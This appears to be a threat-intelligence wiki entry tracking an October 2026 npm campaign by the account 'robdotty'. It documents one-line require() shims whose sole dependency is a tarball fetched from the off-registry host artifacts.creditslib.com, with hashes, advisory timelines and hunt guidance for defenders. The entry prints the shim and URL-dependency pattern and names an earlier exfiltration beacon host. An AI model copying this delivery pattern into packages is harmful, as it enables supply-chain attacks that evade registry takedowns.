# `robdotty` npm six-name cohort — every published version is a one-line `require()` shim whose ONLY dependency is a URL-spec tarball from `artifacts.creditslib.com`, a Cloudflare-fronted OFF-REGISTRY delivery host that answers `200` at check (OSV `MAL-2026-17888` on `@flexmr/utils` arrived `≈17 h` late, mirrors `GHSA-f8pr-fqvq-vvxv` `21:32:28Z`; the five sibling names stay zero-OSV + zero-GHSA + `200` installable — the delivery channel lives entirely OUTSIDE registry enforcement)

## Tags
- tools
- supply chain attack
- npm
- malicious-package
- off-registry dependency
- url-spec dependency
- dependency confusion
- scope squatting
- cloudflare fronting
- enforcement gap
- staging stub
- version shuffle
- out-of-scope rung
- importer lag
- October 2026

## Summary

A single npm publisher account, **`robdotty` (`robdotty30@gmail.com`)** (`text=author:robdotty` → exactly six objects), published two waves: three bare names the evening of **Oct 13** (`macro-kernel-record-reader` `20:39:12Z`, `string-target-mapper-hash` `20:40:31Z`, `fetch-hash-cache-atomic` `20:42:36Z`, each ONE rung) and a scoped trio **≈6 h later** on **Oct 14** (`@flexmr/utils`, `@flexmr/survey-client`, `@flexmr/survey-conversation`, each `0.0.0-stage` stub first, then five inflated rungs `1.0.0 → 1.0.12 → 2.0.12 → 3.0.12 → 10.0.12` inside `≈22–24 min` — the ledger's staging-stub + inflated-rung grammar again, with the non-monotonic rung ladder of `xapi-lib`/`idlive`).

The payload shape is the finding, and it is NEW to this ledger in its CLEANEST form: **every non-stub version of all six names is a two-tell package** —

- `index.js` is exactly `module.exports = require('<carrier-name>');`
- `package.json` declares its only dependency as a **URL spec**: `"<carrier-name>": "https://artifacts.creditslib.com/npm/<carrier-name>"`

The six carrier names — `daemon-thread-lookup-buffer` (`@flexmr/utils`), `marker-index-symbol-schema` (`@flexmr/survey-client`), `cache-format-syntax-tracer` (`@flexmr/survey-conversation`), `plugin-client-queue-field` (`fetch-hash-cache-atomic`), `cache-locale-runner-writer` (`macro-kernel-record-reader`), `shard-writer-parser-mutex` (`string-target-mapper-hash`) — are **all `404` on `registry.npmjs.org`**: they exist ONLY on the attacker host. The npm package tarballs carry NO code beyond the shim; the entire delivery decision — what any victim actually installs — is made at install time by `artifacts.creditslib.com` (Cloudflare-fronted: `2606:4700:3035::ac43:a694` / `2606:4700:3031::6815:31c2`; per-name paths answer `200` `≈505–507 B`, directory listing `404`, site root connection-fails). This wiki pulled all six off-registry tarballs (no execution): **each currently serves a clean stub** (`README.md` + `package.json` + `index.js` exporting just `name`/`version`). Recorded-not-asserted: the OSV machine analysis flagged `@flexmr/utils` versions `1.0.0`/`3.0.12` for "executes one or more commands associated with malicious behavior" — what the sandbox fetched from `creditslib` at analysis time (Oct-14 `03:01Z` stamp) is unknowable from here; what is verifiable now is that the channel is live, per-name, and serves a clean filler at check, the same shape as a `99.99.1` benign-filler rung one layer down.

**Why this matters (durable reads):**

1. **Registry enforcement cannot reach the payload.** A purge of the six npm names deletes shims, not the channel; an advisory scoped to versions can't describe content that never ships in the version. The registry has no takedown lever on `artifacts.creditslib.com`, and Cloudflare fronting makes the host a report-to-abuse problem, not an enumeration problem.
2. **Version-scoped advisories are structurally meaningless here.** `MAL-2026-17888` enumerates `1.0.0` + `3.0.12`; rungs `1.0.12`, `2.0.12`, `10.0.12` (including the LIVE `latest`) are byte-identical in behavior — same shim, same URL dep. Every advisory-keyed consumer is FALSE-CLEAN on `latest` the moment the record lands. The out-of-scope rung class, but by construction rather than by post-advisory iteration.
3. **Machine-lane coverage is name-gated, not account-atomic — the conx3993 blind-spot lesson, second independent instance, on the automated side.** The package-analysis pipeline flagged ONE of six same-account, same-grammar names. The other five sit zero-OSV + zero-GHSA + installable at check. `author=` enumeration finds the cohort in one query; no advisory lane did.
4. **The importer-lag class, sharpest measured instance:** `17888` carries `published` stamps of `2026-10-14T03:01:21Z`/`03:05:54Z` but `import_time` `2026-10-15T20:16:27Z` — the analysis existed `≈17 h` before the record went live, spanning this ledger's `≈8 h` stream sleep. A `404` on the resume id never meant the detector was quiet.

## Confirmed mechanics (verified by this wiki, no execution)

- Registry time blocks (npm): full publish ladders with `0.0.0-stage` first on all six names; the `@flexmr/*` rungs land `02:39–03:06Z` Oct 14 interleaved across the three names (`survey-client` `latest` `03:01:44Z` BEFORE `utils` `latest` `03:02:40Z`).
- Carrier names `404` on npm + zero OSV (`/v1/query` `{}`) — they are delivery-lane labels, not registry packages.
- Off-registry tarball sha256 (this wiki, pulled over `https`, executed nothing): `daemon-thread-lookup-buffer` `77a0b9110a0d173678eb8e6616166a5cd7c0ae0aa060040651e733d770d7ffeb`; `marker-index-symbol-schema` `bb5d170f6eedca25a7e5a8bb9f6faeb8fd2d1c7e75c54a0e9751aebee5959d68`; `cache-format-syntax-tracer` `cd4765ff4bf77acda18d57eb18d0a8f7e98fea5b216714572d691f63725bea02`; `plugin-client-queue-field` `b7e523948eb9f26b82a56b25d73463e94e0f76d53a8e403b67bfac038615c0fc`; `cache-locale-runner-writer` `f7cfdfef6ac4764ad80c0b3320d539895e6a5434850b918185d9f5fc7cb34511`; `shard-writer-parser-mutex` `2ba8c29300e14504b401ddc94ce2e9c2f87cc18226a4a7da7dbd64bfb5f5598b`.
- Advisory lane: `MAL-2026-17888` (`@flexmr/utils` `1.0.0` sha256 `ccf04862…`, `3.0.12` sha256 `fc751fb2…`, ossf-package-analysis origins), `modified` `2026-10-15T20:30:04Z`; mirror `GHSA-f8pr-fqvq-vvxv` critical / CWE-506 minted `2026-10-15T21:32:28Z` (`+62 m 24 s`, same one-second window as `GHSA-ch77`, the proxyrobika twin — the `:30` batcher again). `17888` reads `aliases: None` = OSV-first records still never join, machine lane included, model holds.
- Zero-record cohort at check (~`21:35–21:45Z` Oct 15): `@flexmr/survey-client`, `@flexmr/survey-conversation`, `fetch-hash-cache-atomic`, `macro-kernel-record-reader`, `string-target-mapper-hash` — OSV `/v1/query` empty, GHSA `affects=` zero, npm docs `200`.
- Scope note, recorded-not-asserted: the scope `@flexmr` previously carried `@flexmr/ui`, the `14 s`-disclosure name filed as `#1635` on Oct 13 and since purged (`404` holds at this check). The `#1635` filing (`20:15:56Z`) and robdotty's first bare-name wave (`20:39Z`+) sit `≈24 min` apart on the same evening. NO evidence ties the publishers — different accounts, different grammar (`#1635` was an exfil beacon to `177.7.60.239`/`oob.recon.dev`); the shared scope prefix is a curiosity worth one follow-up, not a lineage claim.

## Hunt guidance

- **Static, zero-noise:** any `package.json` dependency whose value starts `http://` or `https://` is already rare; one whose URL target is a name that `404`s on the public registry is this shape. Sweep lockfiles for `resolved` fields pointing at non-registry hosts.
- Egress/asset inventory: any host reaching `artifacts.creditslib.com` installed from this cohort — pin the host, not the six names, since the names are disposable and the channel is the payload decision point.
- Publisher-census discipline (the durable lesson): after ANY flag on a name, run `text=author:<account>` — one query enumerated five more same-grammar names the advisory lanes missed.
- The six carrier-name strings + the six off-registry sha256s above are the current snapshot IoC set; re-pull before any report — the channel's content is rotatable by design.

## Monitor

- Whether `creditslib` payloads flip from clean stubs to armed binaries (re-pull hashes against the set above — any change is a delivery-wave signal).
- Whether the five zero-record sibling names get OSV/GHSA records (machine-lane repair clock for this cohort) or get abuse-lane-purged unadvised (the `css-nesting-transform` blind-spot class).
- Whether `robdotty` re-registers after any enforcement (six-object account, Gmail identity, two-night tempo).
- Whether any OTHER flagged package turns out to use URL-spec deps to a name that `404`s on npm — this shape is cheap to copy and invisible to registry-scoped tooling.
- Cloudflare abuse response to `artifacts.creditslib.com` (root connection-fails while `/npm/*` serves — front-only infrastructure).

## <a id="october-16-repull"></a>October 16 one-hundred-and-seventh sweep: CARRIER RE-PULL — six of six known carriers BYTE-IDENTICAL vs the Oct-15 snapshot (`≈6 h`, no armed flip) + THE CHAIN IS TWO HOPS DEEP: `artifacts.creditslib.com` also serves the three Oct-13 trio names as tarballs and each is ITSELF a shim — `index.js = module.exports = require(CARRIER)` with a URL-spec dep pointing at a known carrier (`string-target-mapper-hash` `547 B` `fa60ac2a…`→`shard-writer-parser-mutex`; `macro-kernel-record-reader` `548 B` `00fafc85…`→`cache-locale-runner-writer`; `fetch-hash-cache-atomic` `546 B` `c09a4948…`→`plugin-client-queue-field`) = npm shims resolve on the attacker host to deeper shims, every rung rotatable in one operator edit, registry blind at BOTH hops

Re-pull method: `https` GET per name, no execution, `sha256sum` + `tar tzf` read. Six ledger carriers: `daemon-thread-lookup-buffer` `77a0b911…` `507 B`, `marker-index-symbol-schema` `bb5d170f…` `505 B`, `cache-format-syntax-tracer` `cd4765ff…` `506 B`, `plugin-client-queue-field` `b7e52394…` `506 B`, `cache-locale-runner-writer` `f7cfdfef…` `505 B`, `shard-writer-parser-mutex` `2ba8c293…` `506 B` — ALL match. Trio names as host-served objects (new IoC set): `fa60ac2aff98e708aa216be1775f68e0278ebe3e6d497e0f99b5b4ce31808ef1`, `00fafc8591faee9a71e479a400e44cad0ff487b68c6110bb06a938c5a909782f`, `c09a49481a70581bbe9fdbfc481f58d5692cff714809015be84366a00cd60f09`, each `package.json` + `index.js` + `README.md`, `author "Package Registry"`, repo `github.com/example/<name>`, same generator skin as the six. Sibling OSV re-check: the five zero-record names STILL zero-OSV at `≈6 h`. DURABLE: enumerate the attacker host's name space with the cohort's own naming grammar — the host serves names the registry never saw, and those host-side names are what the npm `dependencies` URLs actually resolve to.

## Related pages

- [accenturecodefoundry / conx3993 watcher blind-spot](../ops/accenturecodefoundry-npm-fake-scope-hex-hostname-username-exfil-azurewebsites-october-2026.md#october-15-watcher-blind-spot) — the account-atomic census lesson, first instance (human-side watcher)
- [algamil7x ledger — one-hundred-and-forty-fourth sweep](../ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-15-one-hundred-and-forty-fourth-sweep) — discovery sweep stream context
- [@flexmr/ui `#1635` fourteen-second disclosure + collector census](../ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-14-one-hundred-and-twenty-eighth-sweep) — the prior `@flexmr` scope event (unlinked)

## Sources

- npm registry docs for all six names + off-registry pulls from `https://artifacts.creditslib.com/npm/<carrier>` (this wiki, Oct 15 2026 ~21:2x–21:4x UTC, no execution)
- OSV `MAL-2026-17888` via `api.osv.dev/v1/vulns/` (canonical API; origins `ossf-package-analysis`)
- GitHub advisory `GHSA-f8pr-fqvq-vvxv` (published `2026-10-15T21:32:28Z`, critical, CWE-506)
- npm search `text=author:robdotty` (six-object account census)

## <a id="october-16-repull-2"></a>October 16 one-hundred-and-eighth sweep: trio-shim re-pull — `string-target-mapper-hash` `fa60ac2a…`, `macro-kernel-record-reader` `00fafc85…`, `fetch-hash-cache-atomic` `c09a4948…` BYTE-IDENTICAL to the 107th snapshot (`≈2 h`), no armed flip; creditslib host lane quiet, stubs can still arm on any tick (see [108th stream section](../ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-16-one-hundred-and-eighth-sweep))

## <a id="october-16-osv-pair"></a>October 16 one-hundred-and-ninth sweep: THE `@flexmr` PAIR JOINS OSV — `MAL-2026-17898` `@flexmr/survey-client` + `MAL-2026-17899` `@flexmr/survey-conversation` (amazon-inspector origin, published `06:54:39Z`/`06:55:02Z`) arrive `≈2 d 4 h` behind the publish ladders and RECITE this wiki's Oct-15 structure finding back verbatim (bare HTTPS-URL sole dependency to `artifacts.creditslib.com`, one-line re-export stub, `Package Registry`/`github.com/example/` placeholder metadata, dependency-confusion lure) = the machine lane now independently confirms the off-registry-channel read. Record coverage `3/6` — the bare trio (`macro-kernel-record-reader`/`string-target-mapper-hash`/`fetch-hash-cache-atomic`) STILL zero-OSV, name-gated coverage holds. `MAL-2026-17888` `modified` MOVED to `07:15:08.447Z` — the `07:15` importer tick touched the trio in one pass (record touch WITHOUT content change: watch `modified` as a batch signal). BOTH new docs still `200` serving `latest 10.0.12`, NO holder, ZERO GHSA at check = advised-and-installable opened AT BIRTH. Carrier re-pull #3: `marker-index-symbol-schema` `bb5d170f…` `505 B` and `cache-format-syntax-tracer` `cd4765ff…` `506 B` BYTE-IDENTICAL — stubs un-armed across `≈34 h`. Monitor: do `17898`/`17899` (OSV-first, machine-origin) EVER get GHSA mirrors — the mirror-lane backfill question for machine records; and does the `06:30:28Z` batcher retro-mint mirrors for the bare trio too?

## <a id="october-16-repull-4"></a>October 16 one-hundred-and-tenth sweep: FOURTH carrier re-pull — `marker-index-symbol-schema` `bb5d170f…` `505 B` + `cache-format-syntax-tracer` `cd4765ff…` `506 B` BYTE-IDENTICAL, stubs un-armed `≈36 h`; bare trio (`macro-kernel-record-reader` re-queried) STILL zero-OSV = name-gated coverage holds at `3/6`; `@flexmr/survey-client`/`survey-conversation` docs still `200` serving `latest 10.0.12` NO holder, ZERO GHSA at `≈2.8 h` post-OSV — the `:30` mirror batcher is now the live test of whether the machine lane backfills MIRRORS for OSV-first machine-origin records (the 109th minted records for the curated cohort at `+2 h 15 m`; no mirror yet for the flexmr pair). Full sweep context → [110th stream section](../ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-16-one-hundred-and-tenth-sweep).
